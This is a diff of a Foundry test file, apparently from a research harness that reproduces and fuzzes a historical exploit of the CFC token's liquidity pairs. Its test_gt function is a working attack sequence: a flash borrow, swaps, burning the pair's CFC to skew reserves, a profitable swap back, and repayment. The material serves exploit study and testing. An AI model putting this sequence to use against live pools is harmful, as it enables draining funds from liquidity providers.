+        swap_pair_attacker_safe_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2116,15 +2252,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2143,15 +2281,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
-        swap_CakeLP_attacker_cfc_safe(amt9, amt10);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2170,15 +2310,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
         swap_safeusdtPair_attacker_safe_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
-        swap_CakeLP_attacker_cfc_safe(amt9, amt10);
+        swap_pair_attacker_cfc_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2197,15 +2339,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_usdtcfc_attacker_usdt_cfc(amt7, amt8);
-        swap_CakeLP_attacker_cfc_safe(amt9, amt10);
+        swap_pair_attacker_cfc_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2224,15 +2368,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
-        swap_CakeLP_attacker_cfc_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt3, amt4);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2251,15 +2397,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2278,15 +2426,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
-        swap_CakeLP_attacker_safe_cfc(amt7, amt8);
-        swap_CakeLP_attacker_cfc_safe(amt9, amt10);
+        swap_pair_attacker_safe_cfc(amt7, amt8);
+        swap_pair_attacker_cfc_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2305,15 +2455,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_safe_owner(amt0);
-        swap_CakeLP_attacker_safe_cfc(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt1, amt2);
         swap_usdtcfc_attacker_cfc_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         swap_safeusdtPair_attacker_usdt_safe(amt9, amt10);
         payback_safe_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2332,15 +2484,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_safeusdtPair_attacker_usdt_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2359,15 +2513,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
-        swap_CakeLP_attacker_safe_cfc(amt9, amt10);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2386,15 +2542,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
         swap_safeusdtPair_attacker_safe_usdt(amt3, amt4);
         swap_usdtcfc_attacker_usdt_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2413,15 +2571,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2440,15 +2600,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
-        swap_CakeLP_attacker_cfc_safe(amt1, amt2);
-        swap_CakeLP_attacker_safe_cfc(amt3, amt4);
+        swap_pair_attacker_cfc_safe(amt1, amt2);
+        swap_pair_attacker_safe_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
-        swap_CakeLP_attacker_safe_cfc(amt9, amt10);
+        swap_pair_attacker_safe_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2467,15 +2629,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
         swap_safeusdtPair_attacker_safe_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
-        swap_CakeLP_attacker_safe_cfc(amt9, amt10);
+        swap_pair_attacker_safe_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2494,15 +2658,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
-        swap_CakeLP_attacker_cfc_safe(amt7, amt8);
-        swap_CakeLP_attacker_safe_cfc(amt9, amt10);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt7, amt8);
+        swap_pair_attacker_safe_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2521,15 +2687,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_safeusdtPair_attacker_usdt_safe(amt3, amt4);
-        swap_CakeLP_attacker_safe_cfc(amt5, amt6);
+        swap_pair_attacker_safe_cfc(amt5, amt6);
         swap_usdtcfc_attacker_cfc_usdt(amt7, amt8);
         swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2548,15 +2716,17 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
-        swap_CakeLP_attacker_cfc_safe(amt5, amt6);
+        swap_pair_attacker_cfc_safe(amt5, amt6);
         swap_safeusdtPair_attacker_safe_usdt(amt7, amt8);
         swap_usdtcfc_attacker_usdt_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -2575,38 +2745,53 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt11
     ) public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
         vm.assume(amt11 >= amt0);
         borrow_cfc_owner(amt0);
         swap_usdtcfc_attacker_cfc_usdt(amt1, amt2);
         swap_usdtcfc_attacker_usdt_cfc(amt3, amt4);
         swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
         swap_safeusdtPair_attacker_usdt_safe(amt7, amt8);
-        swap_CakeLP_attacker_safe_cfc(amt9, amt10);
+        swap_pair_attacker_safe_cfc(amt9, amt10);
         payback_cfc_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
+        emit log_named_uint("amt0", 57 * 1e22);
         borrow_usdt_owner(57 * 1e22);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 13 * 1e21);
+        emit log_named_uint(
+            "amt2",
+            safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
+        );
         swap_usdtcfc_attacker_usdt_cfc(
             13 * 1e21,
             safeusdtPair.getAmountOut(13 * 1e21, address(usdt))
         );
         printBalance("After step1 ");
-        burn_cfc_CakeLP((cfc.balanceOf(address(attacker)) * 15) / 16);
+        emit log_named_uint("amt3", 36000 ether);
+        burn_cfc_pair(36000 ether);
         printBalance("After step2 ");
-        burn_cfc_CakeLP(cfc.balanceOf(address(CakeLP)) - 1);
-        printBalance("After step3 ");
-        swap_usdtcfc_attacker_cfc_usdt(
-            cfc.balanceOf(attacker) / 200,
-            CakeLP.getAmountOut(cfc.balanceOf(attacker) / 200, address(cfc))
+        emit log_named_uint("amt4", cfc.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
         );
-        printBalance("After step4 ");
+        swap_usdtcfc_attacker_cfc_usdt(
+            cfc.balanceOf(attacker),
+            (pair.getAmountOut(cfc.balanceOf(attacker), address(cfc)) * 8) / 10
+        );
+        printBalance("After step3 ");
+        emit log_named_uint("amt6", 57 * 1e22);
         payback_usdt_owner(57 * 1e22);
-        printBalance("After step5 ");
+        printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
@@ -2618,18 +2803,18 @@ contract CFCTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4,
         uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt6
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 >= amt0);
+        vm.warp(blockTimestamp);
+        vm.roll(29668034);
+        vm.assume(amt6 >= amt0);
         borrow_usdt_owner(amt0);
         swap_usdtcfc_attacker_usdt_cfc(amt1, amt2);
-        burn_cfc_CakeLP(amt3);
-        burn_cfc_CakeLP(amt4);
-        swap_usdtcfc_attacker_cfc_usdt(amt5, amt6);
-        payback_usdt_owner(amt7);
-        assert(!attackGoal());
+        burn_cfc_pair(amt3);
+        swap_usdtcfc_attacker_cfc_usdt(amt4, amt5);
+        payback_usdt_owner(amt6);
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
